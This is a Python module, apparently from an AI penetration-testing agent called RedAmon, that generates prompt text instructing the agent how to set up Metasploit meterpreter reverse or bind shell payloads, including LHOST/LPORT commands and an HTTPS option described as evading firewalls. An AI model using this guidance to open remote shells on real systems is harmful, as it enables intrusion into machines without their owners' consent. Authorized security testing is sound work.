"""
RedAmon Agent Utility Functions

Utility functions for API and prompts that are not orchestrator-specific.
Orchestrator-specific helpers are in orchestrator_helpers/.
"""

from project_settings import get_setting
from orchestrator_helpers import get_checkpointer


def get_session_count() -> int:
    """Get total number of active sessions."""
    cp = get_checkpointer()
    if cp and hasattr(cp, 'storage'):
        return len(cp.storage)
    return 0


def get_session_config_prompt() -> str:
    """
    Generate a prompt section with pre-configured payload settings.

    Decision Logic (3-way):
        REVERSE: LHOST set AND LPORT set  → clear reverse intent
        BIND:    LHOST empty AND LPORT empty AND BIND_PORT set → clear bind intent
        ASK:     anything else (discordant or all empty) → agent must ask user

    Returns:
        Formatted string with Metasploit commands for the agent.
    """
    # Fetch settings: empty string / None = "not set"
    LHOST = get_setting('LHOST', '') or None
    LPORT = get_setting('LPORT')
    BIND_PORT_ON_TARGET = get_setting('BIND_PORT_ON_TARGET')
    PAYLOAD_USE_HTTPS = get_setting('PAYLOAD_USE_HTTPS', False)

    # -------------------------------------------------------------------------
    # 3-WAY DECISION: reverse / bind / ask user
    # -------------------------------------------------------------------------
    has_lhost = bool(LHOST)
    has_lport = LPORT is not None and LPORT > 0
    has_bind_port = BIND_PORT_ON_TARGET is not None and BIND_PORT_ON_TARGET > 0

    if has_lhost and has_lport:
        mode = "reverse"
    elif not has_lhost and not has_lport and has_bind_port:
        mode = "bind"
    else:
        mode = "ask"

    lines = []
    lines.append("### Pre-Configured Payload Settings")
    lines.append("")

    # -------------------------------------------------------------------------
    # SHOW CONFIGURED MODE
    # -------------------------------------------------------------------------
    if mode == "reverse":
        # =====================================================================
        # REVERSE PAYLOAD: Target connects TO attacker (LHOST:LPORT)
        # =====================================================================
        lines.append("**Mode: REVERSE** (target connects to you)")
        lines.append("")
        lines.append("```")
        lines.append("┌─────────────┐                    ┌─────────────┐")
        lines.append("│   TARGET    │ ───connects to───► │  ATTACKER   │")
        lines.append(f"│             │                    │ {LHOST}:{LPORT} │")
        lines.append("└─────────────┘                    └─────────────┘")
        lines.append("```")
        lines.append("")

        # Determine connection type based on PAYLOAD_USE_HTTPS
        if PAYLOAD_USE_HTTPS:
            conn_type = "reverse_https"
            reason = "PAYLOAD_USE_HTTPS=True (encrypted, evades firewalls)"
        else:
            conn_type = "reverse_tcp"
            reason = "PAYLOAD_USE_HTTPS=False (fastest, plain TCP)"

        lines.append(f"**Payload type:** `{conn_type}` ({reason})")
        lines.append("")
        lines.append("**IMPORTANT: You MUST first set TARGET to Dropper/Staged!**")
        lines.append("```")
        lines.append("show targets")
        lines.append("set TARGET 0   # Choose 'Automatic (Dropper)' or similar")
        lines.append("```")
        lines.append("")
        lines.append("**Then select a Meterpreter reverse payload from `show payloads`:**")
        lines.append("")
        lines.append(f"Look for payloads with `meterpreter/{conn_type}` in the name.")
        lines.append("Choose the appropriate payload based on target platform:")
        lines.append(f"- `cmd/unix/*/meterpreter/{conn_type}` for interpreted languages (PHP, Python, etc.)")
        lines.append(f"- `linux/*/meterpreter/{conn_type}` for Linux native binaries")
        lines.append(f"- `windows/*/meterpreter/{conn_type}` for Windows targets")
        lines.append("")
        lines.append("**Metasploit commands:**")
        lines.append("```")
        lines.append("set PAYLOAD <chosen_payload_from_show_payloads>")
        lines.append(f"set LHOST {LHOST}")
        lines.append(f"set LPORT {LPORT}")
        lines.append("```")
        lines.append("")
        lines.append("After exploit succeeds, use `msf_wait_for_session()` to wait for session.")

    elif mode == "bind":
        # =====================================================================
        # BIND PAYLOAD: Attacker connects TO target (RHOST:BIND_PORT)
        # =====================================================================
        lines.append("**Mode: BIND** (you connect to target)")
        lines.append("")
        lines.append("```")
        lines.append("┌─────────────┐                    ┌─────────────┐")
        lines.append("│  ATTACKER   │ ───connects to───► │   TARGET    │")
        lines.append(f"│    (you)    │                    │ opens :{BIND_PORT_ON_TARGET} │")
        lines.append("└─────────────┘                    └─────────────┘")
        lines.append("```")
        lines.append("")
        lines.append("**Then select a Meterpreter bind payload from `show payloads`:**")
        lines.append("")
        lines.append("Look for payloads with `meterpreter/bind_tcp` in the name.")
        lines.append("Choose the appropriate payload based on target platform:")
        lines.append("- `cmd/unix/*/meterpreter/bind_tcp` for interpreted languages (PHP, Python, etc.)")
        lines.append("- `linux/*/meterpreter/bind_tcp` for Linux native binaries")
        lines.append("- `windows/*/meterpreter/bind_tcp` for Windows targets")
        lines.append("")
        lines.append("**Metasploit commands:**")
        lines.append("```")
        lines.append("set PAYLOAD <chosen_payload_from_show_payloads>")
        lines.append(f"set LPORT {BIND_PORT_ON_TARGET}")
        lines.append("```")
        lines.append("")
        lines.append("**Note:** NO LHOST needed for bind payloads!")
        lines.append(f"After exploit succeeds, use `msf_wait_for_session()` to wait for connection.")

    else:
        # =====================================================================
        # ASK USER: settings are empty or discordant
        # =====================================================================
        lines.append("⚠️ **PAYLOAD DIRECTION NOT CONFIGURED - ASK USER BEFORE EXPLOITING!**")
        lines.append("")
        # Show what's currently set so the agent can explain the problem
        lines.append("**Current settings:**")
        lines.append(f"- LHOST (Attacker IP): `{LHOST or 'empty'}`")
        lines.append(f"- LPORT (Attacker Port): `{LPORT or 'empty'}`")
        lines.append(f"- Bind Port on Target: `{BIND_PORT_ON_TARGET or 'empty'}`")
        lines.append("")
        if has_lhost and not has_lport:
            lines.append("**Problem:** LHOST is set but LPORT is missing. For reverse payloads, both are required.")
        elif has_lport and not has_lhost:
            lines.append("**Problem:** LPORT is set but LHOST is missing. For reverse payloads, both are required.")
        else:
            lines.append("**Problem:** No payload direction is configured.")
        lines.append("")
        lines.append("**Use `action: \"ask_user\"` to ask which payload mode to use:**")
        lines.append("")
        lines.append("1. **REVERSE** (target connects back to you):")
        lines.append("   - Requires: LHOST (your IP) + LPORT (listening port)")
        lines.append("")
        lines.append("2. **BIND** (you connect to target):")
        lines.append("   - Requires: Bind port on target (e.g. 4444)")

    lines.append("")
    lines.append("Replace `<os>/<arch>` with target OS (e.g., `linux/x64`, `windows/x64`).")

    return "\n".join(lines)
